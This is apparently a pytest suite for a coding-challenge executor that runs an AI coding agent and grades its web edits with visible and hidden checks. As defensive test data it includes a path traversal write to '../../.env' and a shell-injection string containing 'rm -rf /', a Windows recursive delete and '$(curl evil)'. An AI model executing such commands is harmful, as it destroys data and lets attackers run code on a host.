import asyncio
import shutil
import subprocess
from dataclasses import replace
from pathlib import Path

import pytest

from app.core.exceptions import LLMTimeoutError
from app.domains.application.models import ApplicationLimits
from app.domains.challenges.models import ChallengeType
from app.domains.evaluation.engine import EvaluationEngine
from app.domains.evaluation.model_execution import LLMExecutionResult
from app.domains.evaluation.results import FailureReason
from app.domains.execution import (
    AgentStatus,
    BuildArtifact,
    BuildStatus,
    ChallengeExecutionRequest,
    ChallengeExecutorResolver,
    ChangedFilesArtifact,
    ScreenshotArtifact,
    TextChallengeExecutor,
    UnsupportedChallengeTypeError,
)
from app.domains.execution.application import ApplicationChallengeExecutor
from app.infrastructure.application import (
    LocalWorkspaceFactory,
    PlaywrightApplicationEvaluator,
    StarterProjectRepository,
)
from app.infrastructure.application import process as process_module
from app.infrastructure.challenges.application_fixtures import (
    RESPONSIVE_HERO_CHALLENGE,
    RESPONSIVE_HERO_CONFIG,
)
from app.infrastructure.challenges.in_memory_hidden_test_repository import (
    InMemoryHiddenTestRepository,
)
from app.infrastructure.challenges.in_memory_repository import EXACT_OUTPUT_CHALLENGE
from tests.fakes.application import (
    STARTER_ROOT,
    FakeCodingAgent,
    FakeEvaluator,
    edit_output,
    solution_output,
    starter_layouts,
    starter_text,
    tree_digest,
)
from tests.fakes.llm import FakeLLMProvider

PROMPT = "Make the hero two columns on desktop and a single column on phones."


def executor(agent, evaluator, tmp_path: Path) -> ApplicationChallengeExecutor:
    return ApplicationChallengeExecutor(
        agent,
        LocalWorkspaceFactory(StarterProjectRepository(), temp_root=tmp_path),
        evaluator,
        StarterProjectRepository(),
    )


def request(playable=RESPONSIVE_HERO_CHALLENGE) -> ChallengeExecutionRequest:
    return ChallengeExecutionRequest(playable=playable, player_prompt=PROMPT)


def with_limits(**limits) -> object:
    config = replace(RESPONSIVE_HERO_CONFIG, limits=ApplicationLimits(**limits))
    return replace(
        RESPONSIVE_HERO_CHALLENGE,
        version=replace(RESPONSIVE_HERO_CHALLENGE.version, application_config=config),
    )


def test_resolver_maps_text_and_application_and_refuses_image(tmp_path: Path) -> None:
    text = TextChallengeExecutor(
        FakeLLMProvider(LLMExecutionResult("YES", "fake")),
        EvaluationEngine.with_builtin_graders(),
        InMemoryHiddenTestRepository(),
    )
    application = executor(FakeCodingAgent(solution_output()), FakeEvaluator(), tmp_path)
    resolver = ChallengeExecutorResolver(
        {ChallengeType.TEXT: text, ChallengeType.APPLICATION: application}
    )
    assert resolver.resolve(ChallengeType.TEXT) is text
    assert resolver.resolve(ChallengeType.APPLICATION) is application
    with pytest.raises(UnsupportedChallengeTypeError):
        resolver.resolve(ChallengeType.IMAGE)


def test_application_executor_refuses_text_challenges(tmp_path: Path) -> None:
    agent = FakeCodingAgent(solution_output())
    with pytest.raises(UnsupportedChallengeTypeError):
        asyncio.run(
            executor(agent, FakeEvaluator(), tmp_path).execute_visible(
                request(EXACT_OUTPUT_CHALLENGE)
            )
        )
    assert agent.tasks == []


def test_visible_run_applies_edit_runs_only_visible_checks_and_collects_artifacts(
    tmp_path: Path,
) -> None:
    before = tree_digest(STARTER_ROOT)
    agent, evaluator = FakeCodingAgent(solution_output()), FakeEvaluator()

    result = asyncio.run(executor(agent, evaluator, tmp_path).execute_visible(request()))

    assert [c.test_case_id for c in result.check_results] == list(
        RESPONSIVE_HERO_CONFIG.visible_checks
    )
    assert (result.passed_checks, result.total_checks, result.evaluation_score) == (4, 4, 100.0)
    changes = next(a for a in result.artifacts if isinstance(a, ChangedFilesArtifact))
    assert changes.agent_status is AgentStatus.APPLIED
    assert [(f.path, f.deletions) for f in changes.files] == [("src/styles.css", 0)]
    assert changes.files[0].additions > 10
    assert (
        next(a for a in result.artifacts if isinstance(a, BuildArtifact)).status
        is BuildStatus.PASSED
    )
    assert [a.viewport for a in result.artifacts if isinstance(a, ScreenshotArtifact)] == [
        "desktop",
        "mobile",
    ]
    # The evaluator saw the agent's edit; the canonical starter did not change; cleanup ran.
    assert evaluator.page_sources == [starter_text("src/index.html")]
    assert not evaluator.roots[0].exists()
    assert tree_digest(STARTER_ROOT) == before


def test_agent_receives_only_the_player_prompt_and_editable_files(tmp_path: Path) -> None:
    agent = FakeCodingAgent(solution_output())
    asyncio.run(executor(agent, FakeEvaluator(), tmp_path).execute_visible(request()))
    task = agent.tasks[0]
    assert task.player_prompt == PROMPT
    assert [f.path for f in task.files] == ["src/index.html", "src/styles.css"]
    assert task.files[1].content == starter_text("src/styles.css")
    assert task.model_config is RESPONSIVE_HERO_CHALLENGE.version.model_config
    serialized = repr(task)
    assert RESPONSIVE_HERO_CHALLENGE.version.objective not in serialized
    for check_id in RESPONSIVE_HERO_CONFIG.hidden_checks:
        assert check_id not in serialized


def test_hidden_submit_runs_hidden_checks_and_normalizes_the_score(tmp_path: Path) -> None:
    result = asyncio.run(
        executor(
            FakeCodingAgent(solution_output()), FakeEvaluator(starter_layouts()), tmp_path
        ).execute_hidden(request())
    )
    assert [c.test_case_id for c in result.check_results] == list(
        RESPONSIVE_HERO_CONFIG.hidden_checks
    )
    assert (result.passed_checks, result.total_checks) == (5, 9)
    assert result.evaluation_score == pytest.approx(500 / 9)
    failed = [c for c in result.check_results if not c.grade.passed]
    assert all(c.grade.failure_reason is FailureReason.CHECK_FAILED for c in failed)


@pytest.mark.parametrize(
    "output",
    [
        "I made the hero responsive!",
        edit_output(**{"build.mjs": "process.exit(0)"}),
        edit_output(**{"../../.env": "x"}),
        edit_output(**{"src/styles.css": starter_text("src/styles.css")}),
        '{"files": []}',
    ],
)
def test_rejected_agent_output_fails_every_check_without_building(
    tmp_path: Path, output: str
) -> None:
    evaluator = FakeEvaluator()
    result = asyncio.run(
        executor(FakeCodingAgent(output), evaluator, tmp_path).execute_visible(request())
    )
    assert (result.passed_checks, result.evaluation_score) == (0, 0.0)
    assert evaluator.roots == []
    changes = next(a for a in result.artifacts if isinstance(a, ChangedFilesArtifact))
    assert changes.agent_status is AgentStatus.REJECTED and changes.message
    assert (
        next(a for a in result.artifacts if isinstance(a, BuildArtifact)).status
        is BuildStatus.SKIPPED
    )
    assert all(
        c.grade.failure_reason is FailureReason.AGENT_OUTPUT_REJECTED for c in result.check_results
    )
    assert list(tmp_path.iterdir()) == []


def test_failed_build_produces_a_deterministic_failure_result(tmp_path: Path) -> None:
    result = asyncio.run(
        executor(
            FakeCodingAgent(solution_output()), FakeEvaluator(build=BuildStatus.FAILED), tmp_path
        ).execute_visible(request())
    )
    assert [c.grade.passed for c in result.check_results] == [False, False, False, False]
    assert not any(isinstance(a, ScreenshotArtifact) for a in result.artifacts)


def test_agent_timeout_is_an_infrastructure_error_and_cleans_up(tmp_path: Path) -> None:
    class SlowAgent(FakeCodingAgent):
        async def apply_instructions(self, task):
            await asyncio.sleep(5)
            return await super().apply_instructions(task)

    evaluator = FakeEvaluator()
    with pytest.raises(LLMTimeoutError):
        asyncio.run(
            executor(SlowAgent(solution_output()), evaluator, tmp_path).execute_visible(
                request(with_limits(agent_timeout_seconds=0.05))
            )
        )
    assert evaluator.roots == []
    assert list(tmp_path.iterdir()) == []


@pytest.mark.skipif(shutil.which("node") is None, reason="Node.js is required")
def test_player_prompt_never_reaches_a_command_line_or_shell(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    calls = []

    def record(args, **kwargs):
        calls.append((args, kwargs))
        return subprocess.CompletedProcess(args, 1, "", "build error: stubbed")

    monkeypatch.setattr(process_module.subprocess, "run", record)
    malicious = 'x"; rm -rf / & del /s /q C:\\ ; $(curl evil) `whoami`'
    playable_request = ChallengeExecutionRequest(RESPONSIVE_HERO_CHALLENGE, malicious)
    evaluator = PlaywrightApplicationEvaluator()
    result = asyncio.run(
        ApplicationChallengeExecutor(
            FakeCodingAgent(solution_output()),
            LocalWorkspaceFactory(StarterProjectRepository(), temp_root=tmp_path),
            evaluator,
            StarterProjectRepository(),
        ).execute_visible(playable_request)
    )
    [(args, kwargs)] = calls
    assert Path(args[0]).stem.lower() == "node" and args[1:] == ["build.mjs"]
    assert kwargs["shell"] is False
    assert kwargs["timeout"] == RESPONSIVE_HERO_CONFIG.limits.build_timeout_seconds
    assert all(malicious not in str(part) for part in args)
    assert malicious not in repr(kwargs["env"])
    assert result.check_results[0].grade.passed is False  # stubbed build failure
